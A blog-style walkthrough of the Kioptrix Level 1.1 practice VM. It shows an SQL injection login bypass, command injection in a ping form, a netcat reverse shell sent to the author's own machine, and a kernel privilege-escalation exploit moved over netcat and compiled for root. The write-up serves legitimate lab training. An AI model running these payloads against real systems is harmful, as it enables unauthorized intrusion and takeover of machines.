The second Kioptrix challenge isn't quite as scan and exploit as the first, but still a relatively easy beginner challenge. The Kioptrix challenges can be downloaded from [http://www.kioptrix.com/blog/?page_id=135](http://www.kioptrix.com/blog/?page_id=135). It's actually labeled as Level 1.1. The author mentions that there are multiple ways to compromise the system. I've only explored one method, which is what I'll be describing here.

Once Kioptrix 1.1 had loaded, I ran a netdiscover scan and found it's IP address on my LAN: 192.168.1.146. I followed up with a port scan:

```
# nmap -sV -A -T4 192.168.1.146

A website is available, and it looks like a MySQL database runs in the backend. nmap also found an open CUPS port. I decided to start with the webserver. Browsing over to http://192.168.1.146, I was greeted with a login form.

I decided to see if I could bypass the authentication mechanism using a simple SQL injection attack. For the username I entered test, and for the password I entered x' or 'x'='x. I was going by the assumption that the backend SQL code looked something like

```sql
SELECT * FROM ACCOUNTS WHERE USERNAME='test' AND PASSWORD='password'
```

By using x' or 'x'='x the query would be changed so that the results would always be true:

```sql
SELECT * FROM ACCOUNTS WHERE USERNAME='test' AND PASSWORD='x' OR 'x'='x'
```

I hit the Login button and was presented with a new form. The SQL injection worked and I was able to login as some authenticated user.

It looked to be some sort of diagnostic tool that allowed an authenticated user to ping a machine. I punched in 127.0.0.1 and hit Submit to see what would happen. A new browser tab opened up that showed the ping results:

I wondered if this form was susceptible to code injection. I assumed that the backend code for this form probably just made a system call to ping and passed it the IP address that I had entered in the form. If that was the case, I could chain my own commands at the end of the IP address and have them execute on the server. I started off with 127.0.0.1;id as a simple test:

Sure enough, right at the end of the ping results, it showed me that the process had run as the apache user. If I could inject code that would run on the webserver, then I could make it give me a reverse shell so that I could have shell access to the server. Probing the system further, I used the whereis command and found netcat. It was time to try a reverse shell. On my terminal I started a netcat listener

```text
# nc -lvp 8080
```

On the webpage I entered the following into the form and hit Submit

```
127.0.0.1;/usr/local/bin/nc 192.168.1.172 8080 -e '/bin/bash'
```

Netcat on the server started up and connected to my netcat listener and gave me a reverse shell.

Now that I had shell access to the system, exploring it would be much easier. Running uname gave me the kernel version, 2.6.9. Checking against exploit-db, I found several exploits against the 2.6.x kernel:

```
# /pentest/exploits/exploitdb/searchsploit kernel 2.6 linux local|sort -n
--------------------------------------------------------------------------- -------------------------
 Description                                                                 Path

Linux Kernel 2.4/2.6 x86-64 System Call Emulation Exploit                   /linux/local/4460.c
```

The ring0 root exploit seemed promising, so I decided to try that one first. Using netcat, I transferred the file from my machine to the target: On my machine:

```
nc -lvp 9998 < /pentest/exploits/exploitdb/linux/local/9479.c
```

On the target machine:

```
cd /tmp/
nc 192.168.1.172 9998 > 9479.c
```

With the ring0 exploit transferred, it was time to compile and run it:

```
gcc 9479.c
./a.out
sh: no job control in this shell
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
sh-3.00#
```

Instant root shell and game over.
This challenge was a just a little bit more involved than the first Kioptrix level. Getting a foothold into the system required a bit of knowledge about SQL injection, and how Linux commands can be chained. If you can find a way to run commands on the server remotely, you're one step closer to rooting it.
